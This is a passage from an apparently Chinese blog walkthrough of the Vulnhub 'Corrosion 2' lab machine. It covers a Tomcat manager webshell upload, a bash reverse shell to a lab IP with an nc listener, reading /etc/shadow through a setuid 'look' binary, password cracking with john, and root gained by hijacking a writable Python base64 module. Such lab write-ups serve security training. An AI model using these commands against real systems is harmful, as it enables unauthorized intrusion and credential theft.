提交得到的账号密码，成功进入使用了\u003ccode\u003eadmin\u003c/code\u003e和\u003ccode\u003emelehifokivai\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubCorrosion%202/image90.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e后台利用\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e进入了\u003ccode\u003etomcat\u003c/code\u003e的后台，涉及到\u003ccode\u003etomcat\u003c/code\u003e后台的利用\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://blog.csdn.net/weixin_41924764/article/details/108196725\"\u003ehttps://blog.csdn.net/weixin_41924764/article/details/108196725\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://blog.csdn.net/qq_43615820/article/details/116357744\"\u003ehttps://blog.csdn.net/qq_43615820/article/details/116357744\u003c/a\u003e 这里使用的是JSP的一句话木马\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e复制恶意代码存为文件\u003ccode\u003e2131.jsp\u003c/code\u003e ，并使用\u003ccode\u003ejar\u003c/code\u003e制作\u003ccode\u003ewar\u003c/code\u003e包\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ejar cvf \u003cspan class=\"hljs-number\"\u003e2131.\u003c/span\u003ewar \u003cspan class=\"hljs-number\"\u003e2131.j\u003c/span\u003esp\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e然后上传\u003ccode\u003ewar\u003c/code\u003e包\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubCorrosion%202/image91.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e上传之后使用蚁🗡连接，测试成功\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubCorrosion%202/image92.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用蚁🗡虚拟终端进行反弹\u003ccode\u003eshell\u003c/code\u003e ，同时\u003ccode\u003ekali\u003c/code\u003e开启监听\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e(tomcat:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/sh: ) $ bash -c \u003cspan class=\"hljs-string\"\u003e'bash -i \u003e\u0026#x26; /dev/tcp/192.168.56.10/1234 0\u003e\u0026#x26;1'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003enc -lvp \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e                             \nlistening on [\u003cspan class=\"hljs-built_in\"\u003eany\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e ...\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.6\u003c/span\u003e: inverse host lookup failed: Unknown host\nconnect to [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e] \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e (UNKNOWN) [\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.6\u003c/span\u003e] \u003cspan class=\"hljs-number\"\u003e58882\u003c/span\u003e\nbash: cannot \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e terminal process group (\u003cspan class=\"hljs-number\"\u003e1277\u003c/span\u003e): Inappropriate ioctl \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e device\nbash: no job control \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e this shell\ntomcat@corrosion:/var/spool/cron$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e获得shell！！！\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e提权 - tomcat用户\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e查看权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003etomcat@corrosion:/var/spool/cron$ whoami\ntomcat\ntomcat@corrosion:/var/spool/cron$ \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=\u003cspan class=\"hljs-number\"\u003e1001\u003c/span\u003e(tomcat) gid=\u003cspan class=\"hljs-number\"\u003e1001\u003c/span\u003e(tomcat) groups=\u003cspan class=\"hljs-number\"\u003e1001\u003c/span\u003e(tomcat)\ntomcat@corrosion:/var/spool/cron$ uname -a\nLinux corrosion \u003cspan class=\"hljs-number\"\u003e5.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e34\u003c/span\u003e-generic \u003cspan class=\"hljs-comment\"\u003e#36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e寻找敏感目录\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e家目录下存在\u003ccode\u003ejaye\u003c/code\u003e文件夹和\u003ccode\u003erandy\u003c/code\u003e文件夹，其中\u003ccode\u003ejaye\u003c/code\u003e没有访问权限，只能看\u003ccode\u003erandy\u003c/code\u003e的文件夹\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003enote.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003etomcat@corrosion:/home/randy$ cat note.txt \nHey randy this \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e your system administrator, hope your having a great day! I just wanted to let you know\nthat I changed your permissions \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e your home directory. You won\u003cspan class=\"hljs-string\"\u003e't be able to remove or add files for now.\n\nI will change these permissions later on.\n\nSee you next Monday randy!\n嘿 randy 我是你的系统管理员，希望你今天过得愉快！我只是想让你知道\n我更改了你的主目录的权限。你现在无法删除或添加文件。\n\n我稍后会更改这些权限。\n\n下周一见 randy！\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003erandombase64.py\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003etomcat@corrosion:/home/randy$ cat randombase64.py \n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e base64\nmessage = \u003cspan class=\"hljs-built_in\"\u003einput\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Enter your string: \"\u003c/span\u003e)\nmessage_bytes = message.encode(\u003cspan class=\"hljs-string\"\u003e'ascii'\u003c/span\u003e)\nbase64_bytes = base64.b64encode(message_bytes)\nbase64_message = base64_bytes.decode(\u003cspan class=\"hljs-string\"\u003e'ascii'\u003c/span\u003e)\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(base64_message)\ntomcat@corrosion:/home/randy$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003etomcat@corrosion:/home/randy$ cat user.txt\nca73a018ae6908a7d0ea5d1c269ba4b6\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e操作了一番还是没找到提权的地方，记得之前给了一串密码\u003ccode\u003emelehifokivai\u003c/code\u003e ，只尝试了randy的用户还有\u003ccode\u003ejaye\u003c/code\u003e账号的没尝试\u003c/p\u003e\n\u003cp\u003e尝试在\u003ccode\u003ejaye\u003c/code\u003e使用\u003ccode\u003essh\u003c/code\u003e登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003essh jaye@\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.6\u003c/span\u003e\njaye@\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.6\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e's password: \nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.11.0-34-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n19 updates can be applied immediately.\nTo see these additional updates run: apt list --upgradable\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\n$ \n\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e登陆成功\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e提权 - jaye用户\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e寻找敏感文件\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e在家目录下存在\u003ccode\u003eFiles\u003c/code\u003e文件夹权限是\u003ccode\u003eroot\u003c/code\u003e的，里边存在个可执行文件\u003ccode\u003elook\u003c/code\u003e ，是\u003ccode\u003eroot\u003c/code\u003e权限的，并且我们拥有执行权限，这样我们就可以使用\u003ccode\u003elook\u003c/code\u003e命令来读取\u003ccode\u003eshadow\u003c/code\u003e文件的内容了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e---s--s--x  \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e14728\u003c/span\u003e Sep \u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2021\u003c/span\u003e look\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用\u003ccode\u003elook\u003c/code\u003e命令读取\u003ccode\u003eshadow\u003c/code\u003e文件，读取\u003ccode\u003eroot\u003c/code\u003e用户以及\u003ccode\u003erandy\u003c/code\u003e用户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e./look -f \u003cspan class=\"hljs-string\"\u003e\"root\"\u003c/span\u003e /etc/shadow\nroot:$\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e$fHvHhNo5DWsYxgt0$\u003cspan class=\"hljs-number\"\u003e.3\u003c/span\u003eupyGTbu9RjpoCkHfW\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003eF9mq5dxjwcqeZl0KnwEr0vXXzi7Tld2lAeYeIio/9BFPjUCyaBeLgVH1yK\u003cspan class=\"hljs-number\"\u003e.5\u003c/span\u003eOR57.:\u003cspan class=\"hljs-number\"\u003e18888\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e99999\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e:::\n./look -f \u003cspan class=\"hljs-string\"\u003e\"randy\"\u003c/span\u003e /etc/shadow\nrandy:$\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi\u003cspan class=\"hljs-number\"\u003e.61\u003c/span\u003eHJ36qXGvFHJGY/:\u003cspan class=\"hljs-number\"\u003e18888\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e99999\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e:::\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e保存为\u003ccode\u003epass\u003c/code\u003e文件放到\u003ccode\u003ejohn\u003c/code\u003e进行爆破，破解了五个多小时，仅破解了\u003ccode\u003erandy\u003c/code\u003e用户的密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e07051986randy (randy)\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用密码登录\u003ccode\u003essh\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003essh randy@\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.6\u003c/span\u003e\nrandy@\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.6\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e's password: \nWelcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.11.0-34-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n19 updates can be applied immediately.\nTo see these additional updates run: apt list --upgradable\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e提权 - randy用户\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e查看权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003erandy@corrosion:~$ sudo -l\n[sudo] password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e randy: \nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e randy on corrosion:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/usr/sbin\\:/usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/sbin\\:/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\\:/snap/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e\n\nUser randy may run the following commands on corrosion:\n    (root) PASSWD: /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/python3\u003cspan class=\"hljs-number\"\u003e.8\u003c/span\u003e /home/randy/randombase64.py\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看\u003ccode\u003e/home/randy/randombase64.py\u003c/code\u003e 是否拥有修改权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e-rwxr-xr-x  \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root  root   \u003cspan class=\"hljs-number\"\u003e210\u003c/span\u003e Sep \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2021\u003c/span\u003e randombase64.py\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e不能直接写入命令\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e我们知道它使用了base64模块，我们直接去修改base64模块\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003erandy@corrosion:~$ ls -al /usr/lib/python3\u003cspan class=\"hljs-number\"\u003e.8\u003c/span\u003e/base64.py \n-rwxrwxrwx \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e20386\u003c/span\u003e Sep \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2021\u003c/span\u003e /usr/lib/python3\u003cspan class=\"hljs-number\"\u003e.8\u003c/span\u003e/base64.py\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e刚好也拥有权限，修改文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# nano /usr/lib/python3.8/base64.py\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e os\n....\n\u003cspan class=\"hljs-keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"hljs-title function_\"\u003eb64encode\u003c/span\u003e(\u003cspan class=\"hljs-params\"\u003es, altchars=\u003cspan class=\"hljs-literal\"\u003eNone\u003c/span\u003e\u003c/span\u003e):\n    os.system(\u003cspan class=\"hljs-string\"\u003e\"/bin/bash\"\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e需要写在\u003ccode\u003eb64encode\u003c/code\u003e 函数里边是因为它文件（\u003ccode\u003erandombase64.py\u003c/code\u003e）里面调用了该函数\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e执行文件\u003ccode\u003erandombase64.py\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003erandy@corrosion:~$ sudo /usr/\u003cspan class=\"hljs-built_in\"\u003ebin\u003c/span\u003e/python3\u003cspan class=\"hljs-number\"\u003e.8\u003c/span\u003e /home/randy/randombase64.py\nEnter your string: \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\nroot@corrosion:/home/randy\u003cspan class=\"hljs-comment\"\u003e# \u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e获得root用户！！！\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e读取\u003ccode\u003eflag\u003c/code\u003e文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eroot@corrosion:~\u003cspan class=\"hljs-comment\"\u003e# cat root.txt\u003c/span\u003e\n2fdbf8d4f894292361d6c72c8e833a4b\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e学到tomcat后台提权方法，其实不止上传war方法，也可以直接使用MSF，不过使用方法是一样的，但是方便\u003c/p\u003e\n\u003cp\u003e以及提权，我们可以直接使用look来读取root的flag文件的，并且在laye用户也可以使用**\u003ccode\u003epolkit-agent-helper-1\u003c/code\u003e** 来提权的，不过拿到root权限不是更好吗\u003c/p\u003e","title":"Vulnhub - Corrosion 2","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"Corrosion: 2\n\n https://www.vulnhub.com/entry/corrosion-2,745/\n \n\n提示：枚举才是神\n\n主机发现端口扫描\n\n1. 使用nmap扫描网段类存活主机\n    \n    因为靶机是我最后添加的，所以靶机IP是`6` ，`kali`是`10`\n    \n    \n    \n2. 扫描主机开放端口\n    \n    \n    \n3. 扫描主机服务..."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"VulnhubCorrosion 2"},"buildId":"mjZBuiwGkP0bnzupdQUa7","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>